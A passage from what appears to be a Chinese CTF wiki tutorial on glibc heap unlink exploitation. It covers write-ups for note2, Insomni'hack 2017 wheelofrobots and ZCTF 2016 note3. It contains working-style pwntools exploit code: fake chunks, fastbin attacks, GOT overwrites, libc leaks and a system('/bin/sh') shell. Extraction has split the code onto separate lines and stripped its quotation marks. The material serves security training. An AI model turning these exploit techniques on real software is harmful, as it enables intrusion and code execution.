\u56fe2\n\n\n\n\n\u8be5\u8986\u76d6\u4e3b\u8981\u662f\u4e3a\u4e86\u91ca\u653echunk2\u7684\u65f6\u5019\u53ef\u4ee5\u540e\u5411\u5408\u5e76\uff08\u5408\u5e76\u4f4e\u5730\u5740\uff09\uff0c\u5bf9chunk0\u4e2d\u865a\u62df\u6784\u9020\u7684chunk\u8fdb\u884cunlink\u3002\u5373\u5c06\u8981\u6267\u884c\u7684\u64cd\u4f5c\u4e3aunlink(ptr[0])\uff0c\u540c\u65f6\u6211\u4eec\u6240\u6784\u9020\u7684fakebk\u548cfakefd\u6ee1\u8db3\u5982\u4e0b\u7ea6\u675f\n\n\n    \nif\n \n(\n__builtin_expect\n \n(\nFD\n-\nbk\n \n!=\n \nP\n \n||\n \nBK\n-\nfd\n \n!=\n \nP\n,\n \n0\n))\n                      \\\n\n\n\n\nunlink\u6210\u529f\u6267\u884c\uff0c\u4f1a\u5bfc\u81f4ptr[0]\u6240\u5b58\u50a8\u7684\u5730\u5740\u53d8\u4e3afakebk\uff0c\u5373ptr-0x18\u3002\n\n\n\u83b7\u53d6system\u5730\u5740\n\n\n\u4ee3\u7801\u5982\u4e0b\n\n\n# overwrite the chunk0(which is ptr[0]) with got atoi\n\n\natoi_got\n \n=\n \nnote2\n.\ngot\n[\natoi\n]\n\n\ncontent\n \n=\n \na\n \n*\n \n0x18\n \n+\n \np64\n(\natoi_got\n)\n\n\neditnote\n(\n0\n,\n \n1\n,\n \ncontent\n)\n\n\n# get the aoti addr\n\n\nshownote\n(\n0\n)\n\n\n\nsh\n.\nrecvuntil\n(\nis \n)\n\n\natoi_addr\n \n=\n \nsh\n.\nrecvuntil\n(\n\\n\n,\n \ndrop\n=\nTrue\n)\n\n\nprint\n \natoi_addr\n\n\natoi_addr\n \n=\n \nu64\n(\natoi_addr\n.\nljust\n(\n8\n,\n \n\\x00\n))\n\n\nprint\n \nleak atoi addr: \n \n+\n \nhex\n(\natoi_addr\n)\n\n\n\n# get system addr\n\n\natoi_offest\n \n=\n \nlibc\n.\nsymbols\n[\natoi\n]\n\n\nlibcbase\n \n=\n \natoi_addr\n \n-\n \natoi_offest\n\n\nsystem_offest\n \n=\n \nlibc\n.\nsymbols\n[\nsystem\n]\n\n\nsystem_addr\n \n=\n \nlibcbase\n \n+\n \nsystem_offest\n\n\n\nprint\n \nleak system addr: \n,\n \nhex\n(\nsystem_addr\n)\n\n\n\n\n\n\u6211\u4eec\u4fee\u6539ptr[0]\u7684\u5185\u5bb9\u4e3a ptr \u7684\u5730\u5740-0x18\uff0c\u6240\u4ee5\u5f53\u6211\u4eec\u518d\u6b21\u7f16\u8f91 note0 \u65f6\uff0c\u53ef\u4ee5\u8986\u76d6ptr[0]\u7684\u5185\u5bb9\u3002\u8fd9\u91cc\u6211\u4eec\u5c06\u5176\u8986\u76d6\u4e3aatoi\u7684\u5730\u5740\u3002\n\u8fd9\u6837\u7684\u8bdd\uff0c\u5982\u679c\u6211\u4eec\u67e5\u770bnote 0\u7684\u5185\u5bb9\uff0c\u5176\u5b9e\u67e5\u770b\u7684\u5c31\u662fatoi\u7684\u5730\u5740\u3002\n\n\n\u4e4b\u540e\u6211\u4eec\u6839\u636e libc \u4e2d\u5bf9\u5e94\u7684\u504f\u79fb\u8ba1\u7b97\u51fa system \u7684\u5730\u5740\u3002\n\n\n\u4fee\u6539atoi got\n\n\n# overwrite the atoi got with systemaddr\n\n\ncontent\n \n=\n \np64\n(\nsystem_addr\n)\n\n\neditnote\n(\n0\n,\n \n1\n,\n \ncontent\n)\n\n\n\n\n\n\u7531\u4e8e\u6b64\u65f6 ptr[0] \u7684\u5730\u5740 got \u8868\u7684\u5730\u5740\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u4fee\u6539\u8be5 note\uff0c\u8986\u76d6\u4e3a system \u5730\u5740\u3002\n\n\nget shell\n\n\n# get shell\n\n\nsh\n.\nrecvuntil\n(\noption---\n)\n\n\nsh\n.\nsendline\n(\n/bin/sh\n)\n\n\nsh\n.\ninteractive\n()\n\n\n\n\n\n\u6b64\u65f6\u5982\u679c\u6211\u4eec\u518d\u8c03\u7528 atoi \uff0c\u5176\u5b9e\u8c03\u7528\u7684\u5c31\u662f system \u51fd\u6570\uff0c\u6240\u4ee5\u5c31\u53ef\u4ee5\u62ff\u5230shell\u4e86\u3002\n\n\n2017 insomni'hack wheelofrobots\n\n\n\u57fa\u672c\u4fe1\u606f\n\n\n\u279c  2017_insomni\nhack_wheelofrobots git:(master) file wheelofrobots \n\n\nwheelofrobots: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=48a9cceeb7cf8874bc05ccf7a4657427fa4e2d78, stripped\n\n\n\u279c  2017_insomni\nhack_wheelofrobots git:\n(\nmaster\n)\n checksec wheelofrobots \n\n[\n*\n]\n \n/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/unlink/2017_insomni\nhack_wheelofrobots/wheelofrobots\n\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE \n(\n0x400000\n)\n\n\n\n\n\n\u52a8\u6001\u94fe\u63a564\u4f4d\uff0c\u4e3b\u8981\u5f00\u542f\u4e86 canary \u4fdd\u62a4\u4e0e nx \u4fdd\u62a4\u3002\n\n\n\u57fa\u672c\u529f\u80fd\n\n\n\u5927\u6982\u5206\u6790\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u5f97\u77e5\uff0c\u8fd9\u662f\u4e00\u4e2a\u914d\u7f6e\u673a\u5668\u4eba\u8f6e\u5b50\u7684\u6e38\u620f\uff0c\u673a\u5668\u4eba\u4e00\u5171\u9700\u8981\u6dfb\u52a0 3 \u4e2a\u8f6e\u5b50\u3002\n\n\n\u7a0b\u5e8f\u975e\u5e38\u4f9d\u8d56\u7684\u4e00\u4e2a\u529f\u80fd\u662f\u8bfb\u53d6\u6574\u6570\uff0c\u8be5\u51fd\u6570read_num\u662f\u8bfb\u53d6\u6307\u5b9a\u7684\u957f\u5ea6\uff0c\u5c06\u5176\u8f6c\u5316\u4e3a int \u7c7b\u578b\u7684\u6570\u5b57\u3002\n\n\n\u5177\u4f53\u529f\u80fd\u5982\u4e0b\n\n\n\n\n\u6dfb\u52a0\u8f6e\u5b50\uff0c\u4e00\u5171\u6709 6 \u4e2a\u8f6e\u5b50\u53ef\u4ee5\u9009\u62e9\u3002\u9009\u62e9\u8f6e\u5b50\u65f6\u4f7f\u7528\u51fd\u6570\u662fread_num\uff0c\u7136\u800c\u8be5\u51fd\u6570\u5728\u8bfb\u53d6\u7684\u65f6\u5019\nread_num((char *)\nchoice, 5uLL);\n \u8bfb\u53d6\u7684\u957f\u5ea6\u662f 5 \u4e2a\u5b57\u8282\uff0c\u6070\u597d\u8986\u76d6\u4e86 bender_inuse \u7684\u6700\u4f4e\u5b57\u8282\uff0c\u5373\u6784\u6210\u4e86 off-by-one \u6f0f\u6d1e\u3002\u4e0e\u6b64\u540c\u65f6\uff0c\u5728\u6dfb\u52a0 Destructor \u8f6e\u5b50\u7684\u65f6\u5019\uff0c\u5e76\u6ca1\u6709\u8fdb\u884c\u5927\u5c0f\u68c0\u6d4b\u3002\u5982\u679c\u8bfb\u53d6\u7684\u6570\u4e3a\u8d1f\u6570\uff0c\u90a3\u4e48\u5728\u7533\u8bf7\ncalloc(1uLL, 20 * v5);\n \u65f6\u5c31\u53ef\u80fd\u5bfc\u81f4 \n20*v5\n \u6ea2\u51fa\uff0c\u4f46\u4e0e\u6b64\u540c\u65f6\uff0c \ndestructor_size = v5\n  \u4ecd\u7136\u4f1a\u5f88\u5927\u3002\n\n\n\u79fb\u9664\u8f6e\u5b50\uff0c\u76f4\u63a5\u5c06\u76f8\u5e94\u8f6e\u5b50\u79fb\u9664\uff0c\u4f46\u662f\u5e76\u6ca1\u6709\u5c06\u5176\u5bf9\u5e94\u7684\u6307\u9488\u8bbe\u7f6e\u4e3a NULL \uff0c\u5176\u5bf9\u5e94\u7684\u5927\u5c0f\u4e5f\u6ca1\u6709\u6e05\u7a7a\u3002\n\n\n\u4fee\u6539\u8f6e\u5b50\u540d\u5b57\uff0c\u8fd9\u4e2a\u662f\u6839\u636e\u5f53\u65f6\u7533\u8bf7\u7684\u8f6e\u5b50\u7684\u5927\u5c0f\u7a7a\u95f4\u6765\u8bfb\u53d6\u6570\u636e\u3002\u4e4b\u524d\u6211\u4eec\u5df2\u7ecf\u8bf4\u8fc7 destructor \u8f6e\u5b50\u8bfb\u53d6\u5927\u5c0f\u65f6\uff0c\u5e76\u6ca1\u6709\u68c0\u6d4b\u8d1f\u6570\u7684\u60c5\u51b5\uff0c\u6240\u4ee5\u5728\u8fdb\u884c\u5982\u4e0b\u64cd\u4f5c\u65f6 \nresult = read(0, destructor, 20 * destructor_size);\n \uff0c\u5b58\u5728\u51e0\u4e4e\u4efb\u610f\u957f\u5ea6\u6ea2\u51fa\u7684\u6f0f\u6d1e\u3002\n\n\n\u542f\u52a8\u673a\u5668\u4eba\uff0c\u5728\u542f\u52a8\u7684\u65f6\u5019\u4f1a\u968f\u673a\u5730\u8f93\u51fa\u4e00\u4e9b\u8f6e\u5b50\u7684\u540d\u79f0\uff0c\u8fd9\u4e2a\u662f\u6211\u4eec\u96be\u4ee5\u63a7\u5236\u7684\u3002\n\n\n\n\n\u7efc\u4e0a\u5206\u6790\uff0c\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\u7684\u662f\uff0c\u8be5\u7a0b\u5e8f\u4e3b\u8981\u5b58\u5728\u7684\u6f0f\u6d1e off-by-one \u4e0e\u6574\u6570\u6ea2\u51fa\u3002\u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u4f7f\u7528\u524d\u9762\u7684off-by-one \u6f0f\u6d1e\u3002\n\n\n\u5229\u7528\u601d\u8def\n\n\n\u57fa\u672c\u5229\u7528\u601d\u8def\u5982\u4e0b\n\n\n\n\n\u5229\u7528 off by one \u6f0f\u6d1e\u4e0e fastbin attack \u5206\u914d chunk \u5230 0x603138\uff0c\u8fdb\u800c\u53ef\u4ee5\u63a7\u5236 \ndestructor_size\n\u7684\u5927\u5c0f\uff0c\u4ece\u800c\u5b9e\u73b0\u4efb\u610f\u957f\u5ea6\u5806\u6ea2\u51fa\u3002\u8fd9\u91cc\u6211\u4eec\u5c06\u8f6e\u5b501 tinny \u5206\u914d\u5230\u8fd9\u91cc\u3002\n\n\n\u5206\u522b\u5206\u914d\u5408\u9002\u5927\u5c0f\u7684\u7269\u7406\u76f8\u90bb\u7684 chunk\uff0c\u5176\u4e2d\u5305\u62ec destructor\u3002\u501f\u52a9\u4e0a\u9762\u53ef\u4ee5\u4efb\u610f\u957f\u5ea6\u5806\u6ea2\u51fa\u7684\u6f0f\u6d1e\uff0c\u5bf9 destructor \u5bf9\u5e94\u7684 chunk \u8fdb\u884c\u6ea2\u51fa\uff0c\u5c06\u5176\u6ea2\u51fa\u5230\u4e0b\u4e00\u4e2a\u7269\u7406\u76f8\u90bb\u7684 chunk\uff0c\u4ece\u800c\u5b9e\u73b0\u5bf9 0x6030E8 \u5904 fake chunk \u8fdb\u884c unlink \u7684\u6548\u679c\uff0c\u8fd9\u65f6 bss \u6bb5\u7684 destructor \u6307\u5411 0x6030D0\u3002\u4ece\u800c\uff0c\u6211\u4eec\u53ef\u4ee5\u518d\u6b21\u5b9e\u73b0\u8986\u76d6bss \u6bb5\u51e0\u4e4e\u6240\u6709\u7684\u5185\u5bb9\u3002\n\n\n\u6784\u9020\u4e00\u4e2a\u4efb\u610f\u5730\u5740\u5199\u7684\u6f0f\u6d1e\u3002\u901a\u8fc7\u4e0a\u8ff0\u7684\u6f0f\u6d1e\u5c06\u5df2\u7ecf\u5206\u914d\u7684\u8f6e\u5b501 tinny \u6307\u9488\u8986\u76d6\u4e3a destructor \u7684\u5730\u5740\uff0c\u90a3\u4e48\u6b64\u540e\u7f16\u8f91 tinny \u5373\u5728\u7f16\u8f91 destructor \u7684\u5185\u5bb9\uff0c\u8fdb\u800c\u5f53\u6211\u4eec\u518d\u6b21\u7f16\u8f91 destructor \u65f6\u5c31\u76f8\u5f53\u4e8e\u4efb\u610f\u4f4e\u5730\u5740\u5199\u3002\n\n\n\u7531\u4e8e\u7a0b\u5e8f\u53ea\u662f\u5728\u6700\u540e\u542f\u52a8\u673a\u5668\u4eba\u7684\u65f6\u5019\uff0c\u624d\u4f1a\u968f\u673a\u8f93\u51fa\u4e00\u4e9b\u8f6e\u5b50\u7684\u5185\u5bb9\uff0c\u5e76\u4e14\u4e00\u65e6\u8f93\u51fa\uff0c\u7a0b\u5e8f\u5c31\u4f1a\u9000\u51fa\uff0c\u7531\u4e8e\u8fd9\u90e8\u5206\u6211\u4eec\u5e76\u4e0d\u80fd\u63a7\u5236\uff0c\u6240\u4ee5\u6211\u4eec\u5c06 \nexit()\n patch \u4e3a\u4e00\u4e2a \nret\n \u5730\u5740\u3002\u8fd9\u6837\u7684\u8bdd\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u591a\u6b21\u8f93\u51fa\u5185\u5bb9\u4e86\uff0c\u4ece\u800c\u53ef\u4ee5\u6cc4\u6f0f\u4e00\u4e9b got \u8868\u5730\u5740\u3002\n\u5176\u5b9e\uff0c\u65e2\u7136\u6211\u4eec\u6709\u4e86\u4efb\u610f\u5730\u5740\u5199\u7684\u6f0f\u6d1e\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u5c06\u67d0\u4e2a got \u5199\u4e3a puts \u7684 plt \u5730\u5740\uff0c\u8fdb\u800c\u8c03\u7528\u76f8\u5e94\u51fd\u6570\u65f6\u4fbf\u53ef\u4ee5\u76f4\u63a5\u5c06\u76f8\u5e94\u5185\u5bb9\u8f93\u51fa\u3002\u4f46\u662f\u8fd9\u91cc\u5e76\u4e0d\u53bb\u91c7\u7528\u8fd9\u79cd\u65b9\u6cd5\uff0c\u56e0\u4e3a\u4e4b\u524d\u5df2\u7ecf\u5728 hitcon stkof \u4e2d\u7528\u8fc7\u8fd9\u79cd\u624b\u6cd5\u4e86\u3002\n\n\n\u5728\u6cc4\u6f0f\u4e86\u76f8\u5e94\u7684\u5185\u5bb9\u540e\uff0c\u6211\u4eec\u4fbf\u53ef\u4ee5\u5f97\u5230 libc \u57fa\u5730\u5740\uff0csystem \u5730\u5740\uff0clibc\u4e2d\u7684 /bin/sh \u5730\u5740\u3002\u8fdb\u800c\u6211\u4eec\u4fee\u6539 free@got \u4e3a system \u5730\u5740\u3002\u4ece\u800c\u5f53\u518d\u6b21\u91ca\u653e\u67d0\u5757\u5185\u5b58\u65f6\uff0c\u4fbf\u53ef\u4ee5\u542f\u52a8shell\u3002\n\n\n\n\n\u4ee3\u7801\u5982\u4e0b\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\ncontext\n.\nterminal\n \n=\n \n[\ngnome-terminal\n,\n \n-x\n,\n \nsh\n,\n \n-c\n]\n\n\nif\n \nargs\n[\nDEBUG\n]:\n\n    \ncontext\n.\nlog_level\n \n=\n \ndebug\n\n\ncontext\n.\nbinary\n \n=\n \n./wheelofrobots\n\n\nrobots\n \n=\n \nELF\n(\n./wheelofrobots\n)\n\n\nif\n \nargs\n[\nREMOTE\n]:\n\n    \np\n \n=\n \nremote\n(\n127.0.0.1\n,\n \n7777\n)\n\n\nelse\n:\n\n    \np\n \n=\n \nprocess\n(\n./wheelofrobots\n)\n\n\nlog\n.\ninfo\n(\nPID: \n \n+\n \nstr\n(\nproc\n.\npidof\n(\np\n)[\n0\n]))\n\n\nlibc\n \n=\n \nELF\n(\n./libc.so.6\n)\n\n\n\n\ndef\n \noffset_bin_main_arena\n(\nidx\n):\n\n    \nword_bytes\n \n=\n \ncontext\n.\nword_size\n \n/\n \n8\n\n    \noffset\n \n=\n \n4\n  \n# lock\n\n    \noffset\n \n+=\n \n4\n  \n# flags\n\n    \noffset\n \n+=\n \nword_bytes\n \n*\n \n10\n  \n# offset fastbin\n\n    \noffset\n \n+=\n \nword_bytes\n \n*\n \n2\n  \n# top,last_remainder\n\n    \noffset\n \n+=\n \nidx\n \n*\n \n2\n \n*\n \nword_bytes\n  \n# idx\n\n    \noffset\n \n-=\n \nword_bytes\n \n*\n \n2\n  \n# bin overlap\n\n    \nreturn\n \noffset\n\n\n\n\ndef\n \nadd\n(\nidx\n,\n \nsize\n=\n0\n):\n\n    \np\n.\nrecvuntil\n(\nYour choice :\n)\n\n    \np\n.\nsendline\n(\n1\n)\n\n    \np\n.\nrecvuntil\n(\nYour choice :\n)\n\n    \np\n.\nsendline\n(\nstr\n(\nidx\n))\n\n    \nif\n \nidx\n \n==\n \n2\n:\n\n        \np\n.\nrecvuntil\n(\nIncrease Bender\ns intelligence: \n)\n\n        \np\n.\nsendline\n(\nstr\n(\nsize\n))\n\n    \nelif\n \nidx\n \n==\n \n3\n:\n\n        \np\n.\nrecvuntil\n(\nIncrease Robot Devil\ns cruelty: \n)\n\n        \np\n.\nsendline\n(\nstr\n(\nsize\n))\n\n    \nelif\n \nidx\n \n==\n \n6\n:\n\n        \np\n.\nrecvuntil\n(\nIncrease Destructor\ns powerful: \n)\n\n        \np\n.\nsendline\n(\nstr\n(\nsize\n))\n\n\n\n\ndef\n \nremove\n(\nidx\n):\n\n    \np\n.\nrecvuntil\n(\nYour choice :\n)\n\n    \np\n.\nsendline\n(\n2\n)\n\n    \np\n.\nrecvuntil\n(\nYour choice :\n)\n\n    \np\n.\nsendline\n(\nstr\n(\nidx\n))\n\n\n\n\ndef\n \nchange\n(\nidx\n,\n \nname\n):\n\n    \np\n.\nrecvuntil\n(\nYour choice :\n)\n\n    \np\n.\nsendline\n(\n3\n)\n\n    \np\n.\nrecvuntil\n(\nYour choice :\n)\n\n    \np\n.\nsendline\n(\nstr\n(\nidx\n))\n\n    \np\n.\nrecvuntil\n(\nRobot\ns name: \n\\n\n)\n\n    \np\n.\nsend\n(\nname\n)\n\n\n\n\ndef\n \nstart_robot\n():\n\n    \np\n.\nrecvuntil\n(\nYour choice :\n)\n\n    \np\n.\nsendline\n(\n4\n)\n\n\n\n\ndef\n \noverflow_benderinuse\n(\ninuse\n):\n\n    \np\n.\nrecvuntil\n(\nYour choice :\n)\n\n    \np\n.\nsendline\n(\n1\n)\n\n    \np\n.\nrecvuntil\n(\nYour choice :\n)\n\n    \np\n.\nsend\n(\n9999\n \n+\n \ninuse\n)\n\n\n\n\ndef\n \nwrite\n(\nwhere\n,\n \nwhat\n):\n\n    \nchange\n(\n1\n,\n \np64\n(\nwhere\n))\n\n    \nchange\n(\n6\n,\n \np64\n(\nwhat\n))\n\n\n\n\ndef\n \nexp\n():\n\n    \nprint\n \nstep 1\n\n    \n# add a fastbin chunk 0x20 and free it\n\n    \n# so it is in fastbin, idx2-\nNULL\n\n    \nadd\n(\n2\n,\n \n1\n)\n  \n# idx2\n\n    \nremove\n(\n2\n)\n\n    \n# overflow bender inuse with 1\n\n    \noverflow_benderinuse\n(\n\\x01\n)\n\n    \n# change bender\ns fd to 0x603138, point to bender\ns size\n\n    \n# now fastbin 0x20, idx2-\n0x603138-\nNULL\n\n    \nchange\n(\n2\n,\n \np64\n(\n0x603138\n))\n\n    \n# in order add bender again\n\n    \noverflow_benderinuse\n(\n\\x00\n)\n\n    \n# add bender again, fastbin 0x603138-\nNULL\n\n    \nadd\n(\n2\n,\n \n1\n)\n\n    \n# in order to malloc chunk at 0x603138\n\n    \n# we need to bypass the fastbin size check, i.e. set *0x603140=0x20\n\n    \n# it is at Robot Devil\n\n    \nadd\n(\n3\n,\n \n0x20\n)\n\n    \n# trigger malloc, set tinny point to 0x603148\n\n    \nadd\n(\n1\n)\n\n    \n# wheels must \n= 3\n\n    \nremove\n(\n2\n)\n\n    \nremove\n(\n3\n)\n\n\n    \nprint\n \nstep 2\n\n    \n# alloc Destructor size 60-\n0x50, chunk content 0x40\n\n    \nadd\n(\n6\n,\n \n3\n)\n\n    \n# alloc devil, size=20*7=140, bigger than fastbin\n\n    \nadd\n(\n3\n,\n \n7\n)\n\n    \n# edit destructor\ns size to 1000 by tinny\n\n    \nchange\n(\n1\n,\n \np64\n(\n1000\n))\n\n    \n# place fake chunk at destructor\ns pointer\n\n    \nfakechunk_addr\n \n=\n \n0x6030E8\n\n    \nfakechunk\n \n=\n \np64\n(\n0\n)\n \n+\n \np64\n(\n0x20\n)\n \n+\n \np64\n(\nfakechunk_addr\n \n-\n \n0x18\n)\n \n+\n \np64\n(\n\n        \nfakechunk_addr\n \n-\n \n0x10\n)\n \n+\n \np64\n(\n0x20\n)\n\n    \nfakechunk\n \n=\n \nfakechunk\n.\nljust\n(\n0x40\n,\n \na\n)\n\n    \nfakechunk\n \n+=\n \np64\n(\n0x40\n)\n \n+\n \np64\n(\n0xa0\n)\n\n    \nchange\n(\n6\n,\n \nfakechunk\n)\n\n    \n# trigger unlink\n\n    \nremove\n(\n3\n)\n\n\n    \nprint\n \nstep 3\n\n    \n# make 0x6030F8 point to 0x6030E8\n\n    \npayload\n \n=\n \np64\n(\n0\n)\n \n*\n \n2\n \n+\n \n0x18\n \n*\n \na\n \n+\n \np64\n(\n0x6030E8\n)\n\n    \nchange\n(\n6\n,\n \npayload\n)\n\n\n    \nprint\n \nstep 4\n\n    \n# make exit just as return\n\n    \nwrite\n(\nrobots\n.\ngot\n[\nexit\n],\n \n0x401954\n)\n\n\n    \nprint\n \nstep 5\n\n    \n# set wheel cnt =3, 0x603130 in order to start robot\n\n    \nwrite\n(\n0x603130\n,\n \n3\n)\n\n    \n# set destructor point to puts@got\n\n    \nchange\n(\n1\n,\n \np64\n(\nrobots\n.\ngot\n[\nputs\n]))\n\n    \nstart_robot\n()\n\n    \np\n.\nrecvuntil\n(\nNew hands great!! Thx \n)\n\n    \nputs_addr\n \n=\n \np\n.\nrecvuntil\n(\n!\n\\n\n,\n \ndrop\n=\nTrue\n)\n.\nljust\n(\n8\n,\n \n\\x00\n)\n\n    \nputs_addr\n \n=\n \nu64\n(\nputs_addr\n)\n\n    \nlog\n.\nsuccess\n(\nputs addr: \n \n+\n \nhex\n(\nputs_addr\n))\n\n    \nlibc_base\n \n=\n \nputs_addr\n \n-\n \nlibc\n.\nsymbols\n[\nputs\n]\n\n    \nlog\n.\nsuccess\n(\nlibc base: \n \n+\n \nhex\n(\nlibc_base\n))\n\n    \nsystem_addr\n \n=\n \nlibc_base\n \n+\n \nlibc\n.\nsymbols\n[\nsystem\n]\n\n    \nbinsh_addr\n \n=\n \nlibc_base\n \n+\n \nnext\n(\nlibc\n.\nsearch\n(\n/bin/sh\n))\n\n\n    \n# make free-\nsystem\n\n    \nwrite\n(\nrobots\n.\ngot\n[\nfree\n],\n \nsystem_addr\n)\n\n    \n# make destructor point to /bin/sh addr\n\n    \nwrite\n(\n0x6030E8\n,\n \nbinsh_addr\n)\n\n    \n# get shell\n\n    \nremove\n(\n6\n)\n\n    \np\n.\ninteractive\n()\n\n\n    \npass\n\n\n\n\nif\n \n__name__\n \n==\n \n__main__\n:\n\n    \nexp\n()\n\n\n\n\n\n\u9898\u76ee\n\n\n\n\nDEFCON 2017 Qualifiers beatmeonthedl\n \n\n\n\n\n\u53c2\u8003\n\n\n\n\nmalloc@angelboy\n\n\nhttps://gist.github.com/niklasb/074428333b817d2ecb63f7926074427a\n\n\n\n\nnote3\n\n\n\u4ecb\u7ecd\n\n\nZCTF 2016\u7684\u4e00\u9053\u9898\u76ee\uff0c\u8003\u70b9\u662fsafe unlink\u7684\u5229\u7528\u3002\n\n\n\u9898\u76ee\u4ecb\u7ecd\n\n\n\u9898\u76ee\u662f\u4e00\u4e2anotepad\uff0c\u63d0\u4f9b\u4e86\u521b\u5efa\u3001\u5220\u9664\u3001\u7f16\u8f91\u3001\u67e5\u770b\u7b14\u8bb0\u7684\u529f\u80fd\n\n\n1.New note\n2.Show note\n3.Edit note\n4.Delete note\n5.Quit\noption---\n\n\n\n\n\n\u4fdd\u62a4\u5982\u4e0b\u6240\u793a\n\n\nCanary                        : Yes\nNX                            : Yes\nPIE                           : No\nFortify                       : No\nRelRO                         : Partial\n\n\n\n\n\u529f\u80fd\u6982\u8ff0\n\n\n\u7a0b\u5e8fNew\u529f\u80fd\u7528\u6765\u65b0\u5efa\u7b14\u8bb0\uff0c\u7b14\u8bb0\u7684\u5927\u5c0f\u53ef\u4ee5\u81ea\u5b9a\u53ea\u8981\u5c0f\u4e8e1024\u5b57\u8282\u3002\n\n\nint new()\n{\n  puts(\nInput the length of the note content:(less than 1024)\n);\n  size = get_num();\n  if ( size \n 0 )\n    return puts(\nLength error\n);\n  if ( size \n 1024 )\n    return puts(\nContent is too long\n);\n  heap_ptr = malloc(size);\n  puts(\nInput the note content:\n);\n  my_read(heap_ptr, size, \n\\n\n);\n  bss_ptr[i] = heap_ptr;\n  current_ptr[i + 8LL] = size;\n  current_ptr[0] = bss_ptr[i];\n  return printf(\nnote add success, the id is %d\\n\n, i);\n}\n\n\n\n\n\u6240\u6709\u7684\u7b14\u8bb0malloc\u51fa\u6765\u7684\u6307\u9488\u5b58\u653e\u5728bss\u4e0a\u5168\u5c40\u6570\u7ec4bss_ptr\u4e2d\uff0c\u8fd9\u4e2a\u6570\u7ec4\u6700\u591a\u53ef\u4ee5\u5b58\u653e7\u4e2aheap_ptr\u3002\n\u800c\u4e14heap_ptr\u5bf9\u5e94\u7684size\u4e5f\u88ab\u653e\u5728bss_ptr\u6570\u7ec4\u4e2d\u3002current_ptr\u8868\u793a\u5f53\u524d\u7b14\u8bb0\uff0cbss\u5e03\u5c40\u5982\u4e0b\u3002\n\n\n.bss:\ncurrent_ptr\nnote0_ptr\nnote1_ptr\nnote2_ptr\nnote3_ptr\nnote4_ptr\nnote5_ptr\nnote6_ptr\nnote7_ptr\nnote0_size\nnote1_size\nnote2_size\nnote3_size\nnote4_size\nnote5_size\nnote6_size\nnote7_size\n\n\n\n\nShow\u529f\u80fd\u662f\u65e0\u7528\u7684\u529f\u80fd\uff0cedit\u548cdelete\u53ef\u4ee5\u7f16\u8f91\u548c\u91ca\u653enote\u3002\n\n\n\u6f0f\u6d1e\n\n\n\u6f0f\u6d1e\u5b58\u5728\u4e8eedit\u529f\u80fd\u4e2d\uff0c\u8fd9\u91cc\u9762\u5728\u83b7\u53d6\u7528\u6237\u8f93\u5165\u7684id\u53f7\u4e4b\u540e\u5e76\u6ca1\u6709\u8fdb\u884c\u9a8c\u8bc1\u3002\u5982\u679c\u8f93\u5165\u7684id\u662f\u8d1f\u6570\u7684\u8bdd\u4f9d\u7136\u53ef\u4ee5\u6267\u884c\u3002\n\u5728get_num\u51fd\u6570\u4e2d\u5b58\u5728\u6574\u6570\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u6211\u4eec\u53ef\u4ee5\u83b7\u5f97\u4e00\u4e2a\u8d1f\u6570\u3002\n\n\nint edit()\n{\n\n  id = get_num();\n  data_ptr = ptr[id];\n  if ( data_ptr )\n  {\n    puts(\nInput the new content:\n);\n    my_read(ptr[id], current_ptr[id + 8], \n\\n\n);\n    current_ptr[0] = ptr[id];\n    data_ptr = puts(\nEdit success\n);\n  }\n}\n\n\n\n\n\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u4f7f\u5f97edit\u8bfb\u5165cuurent_ptr\uff0c\u4f7f\u7528\u7684size\u662fnote7_ptr\n\n.bss:\ncurrent_ptr \n== edit ptr\nnote0_ptr\nnote1_ptr\nnote2_ptr\nnote3_ptr\nnote4_ptr\nnote5_ptr\nnote6_ptr\nnote7_ptr   \n== size\nnote0_size\nnote1_size\nnote2_size\nnote3_size\nnote4_size\nnote5_size\nnote6_size\nnote7_size\n\n\n\u9996\u5148\u521b\u5efa8\u4e2anote\uff0c\u7136\u540eedit note3\u4f7fcurrent_ptr\u6307\u5411note3\uff0c\u4e4b\u540e\u4f7f\u7528-1\u6ea2\u51fanote3\n\nnew(512,\na\n)\nnew(512,\na\n)\nnew(512,\na\n)\nnew(512,\na\n)\nnew(512,\na\n)\nnew(512,\na\n)\nnew(512,\na\n)\nnew(512,\na\n)\n\nedit(3,\na\n)\nedit(-9223372036854775808,data);\n\n\n\n\u6211\u4eec\u4f7f\u7528\u7684\u6ea2\u51fa\u6570\u636e\u662f\u7528\u4e8e\u6784\u9020\u4e00\u4e2afake chunk\u6765\u5b9e\u73b0safe unlink\u7684\u5229\u7528\uff0c\u5177\u4f53\u7684\u539f\u7406\u53ef\u4ee5\u770b\u8fd9\u4e00\u7ae0\u8282\u7684\u8bb2\u89e3\u3002\n\n\ndata = \n\ndata += p64(0) + p64(512+1) #fake chunk header\ndata += p64(0x6020e0-0x18) + p64(0x6020e0-0x10) #fake fd and bk \ndata += \nA\n*(512-32) \ndata += p64(512) + p64(512+16) \n\n\n\n\n\u4e4b\u540e\u91ca\u653enote4\uff0cnote3\u4e0enote4\u5c31\u4f1a\u5408\u5e76\u3002note3_ptr\u4f1a\u6307\u5411note0_ptr\u7684\u4f4d\u7f6e\u3002\u8fd9\u6837\u6211\u4eec\u901a\u8fc7\u4e0d\u65ad\u7684\u4fee\u6539note0_ptr\u7684\u503c\u548cedit 